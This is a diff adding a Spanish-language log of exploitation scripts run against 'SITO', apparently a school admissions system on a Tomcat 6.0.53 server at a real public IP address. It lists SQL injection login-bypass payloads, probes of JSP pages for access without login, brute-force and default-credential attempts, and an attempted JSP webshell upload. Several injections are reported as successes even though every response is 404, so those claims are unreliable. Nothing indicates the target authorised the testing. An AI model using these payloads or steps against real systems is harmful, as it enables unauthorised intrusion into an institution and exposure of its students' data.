@@ -1,0 +1,106 @@
+Script de Explotación del Formulario de Login SITO:
+
+[*] Analizando formulario de login SITO...
+[+] Hidden field: yAccion =
+[+] Hidden field: yIntentos = 1
+[+] Hidden field: yUsuario =
+
+[*] Probando SQL injection en login SITO...
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: admin' OR '1'='1'--
+    Contraseña: anything
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: admin' OR 1=1--
+    Contraseña: test
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: ' OR '1'='1'--
+    Contraseña: password
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: admin'--
+    Contraseña: test
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: ' OR 1=1--
+    Contraseña: pass
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: admin' /*
+    Contraseña: test
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: x' OR user_name != '
+    Contraseña: y
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: admin' UNION SELECT 1,2,3,4--
+    Contraseña: test
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: ' OR 'a'='a
+    Contraseña: pass
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+[!] ¡POSIBLE SQL INJECTION EXITOSO!
+    Usuario: admin' OR 'a'='a
+    Contraseña: test
+    Response: 404
+[+] Respuesta guardada en sql_injection_success.html
+
+[*] Fuerza bruta personalizada para SITO...
+
+[*] Probando contraseñas por defecto...
+
+[*] Explotando rutas JSP específicas...
+[+] JSP accesible: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N
+    Parámetro: xModalidadP=N
+    [+] Posiblemente accesible sin login
+[+] JSP accesible: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D
+    Parámetro: xModalidadP=D
+    [+] Posiblemente accesible sin login
+[+] JSP accesible: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z
+    Parámetro: xModalidadP=Z
+    [+] Posiblemente accesible sin login
+[+] JSP accesible: /jsp/escolar/proceso_admision_lic/proceso_interesado.jsp
+    [+] Posiblemente accesible sin login
+[+] JSP accesible: /jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1
+    Parámetro: xNuevo=1
+    [+] Posiblemente accesible sin login
+
+Script de Análisis de JSP y Directory Traversal Específico:
+
+[*] Directory traversal mediante rutas JSP...
+
+[*] Probando inyección en parámetros JSP...
+[+] Parámetros aceptados en /jsp/escolar/proceso_admision/proceso_interesado.jsp
+[!] Posible SQL injection en /jsp/seguimiento_egreso/proceso_registro_egresado.jsp
+
+[*] Descubriendo archivos JSP adicionales...
+[+] JSP encontrado: /jsp/index.jsp
+
+Script de Fuerza Bruta con Patrones SITO:
+
+=== EXPLOTACIÓN COMPLETA TOMCAT 6.0.53 ===
+
+[*] Ejecutando exploits específicos para Tomcat 6.0.53...
+
+[*] Explotando RequestParamExample...
+
+[*] Explotando SessionExample...
+[-] Error en SessionExample: There are multiple cookies with name, 'JSESSIONID'
+
+[*] Probando credenciales específicas de Tomcat 6...
+[-] No se encontraron credenciales válidas
+
+[*] Intentando upload de webshell JSP...
+[+] Directorio accesible: https://189.254.143.102/examples/servlets/
